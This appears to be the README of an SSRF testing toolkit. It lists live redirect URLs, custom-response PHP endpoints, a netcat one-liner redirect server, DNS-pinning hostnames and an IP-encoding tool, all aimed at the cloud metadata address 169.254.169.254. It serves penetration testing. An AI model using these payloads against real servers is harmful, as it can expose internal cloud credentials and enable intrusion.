# SSRF Testing

***

### htaccess - redirect test for various cases
Status codes: 300, 301, 302, 303, 305, 307, 308

Filetypes: jpg, json, csv, xml
#### Live demo:
jpg 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg`

`https://ssrf.localdomain.pw/img-with-body/301-https-169.254.169.254:80-.i.jpg`


json 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json`

`https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json`


csv 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/csv-without-body/301-https-169.254.169.254:80-.c.csv`

`https://ssrf.localdomain.pw/csv-with-body/301-https-169.254.169.254:80-.c.csv`


xml 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml`

`https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml`

***

### custom-30x - Custom 30x responses and Location header with php

#### Live demo:

`https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-200 - Custom 200 response and Content-Location header with php

#### Live demo:

`https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-201 - Custom 201 response and Location header with php

#### Live demo:

`https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### Minimal web server using netcat

`while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\n \nContent-Type:application/json \nLocation:http://169.254.169.254/\n\n {\"a\":\"b\"}"'; done`

***

### ip.py - Alternate IP encoding tool useful for SSRF Testing

python ip.py IP EXPORT(optional)

python ip.py 169.254.169.254

python ip.py 169.254.169.254 export

***

### DNS pinning

nslookup ssrf-169.254.169.254.localdomain.pw

***

### DNS pinning race condition

nslookup ssrf-race-169.254.169.254.localdomain.pw

***

### cloud-metadata.txt - Cloud Metadata Dictionary useful for SSRF Testing

***

### AppSecEU15-Server_side_browsing_considered_harmful.pdf
https://www.youtube.com/watch?v=8t5-A4ASTIU

***

### SSRF bible
https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM

***
